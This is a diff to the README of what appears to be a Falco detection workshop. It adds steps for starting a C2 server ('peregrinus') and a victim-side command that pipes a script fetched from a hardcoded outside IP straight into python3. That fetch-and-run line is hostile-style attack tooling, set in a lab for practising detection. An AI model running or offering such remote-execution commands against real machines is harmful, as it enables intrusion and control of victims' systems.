@@ -12,19 +12,28 @@ Remember:
     go list -m -versions github.com/diego-all/falco-workshop
 
 
-In C2 Server execute:
+## Installation
+
+    kubectl apply -f k8s/victim-workshop.yaml
+
+
+## Execution
+
+
+In C2 Server (peregrinus) execute:
 
 
     cd /root
-
     python3 -m http.server 80
+
+    go run peregrinus.go
 
 
 
 In victim machine execute:
 
 
-    curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
+    curl -sL http://34.27.180.215:8080/sitio/vuelta.txt | python3
 
 
     go run github.com/diego-all/falco-workshop@latest init --vector A
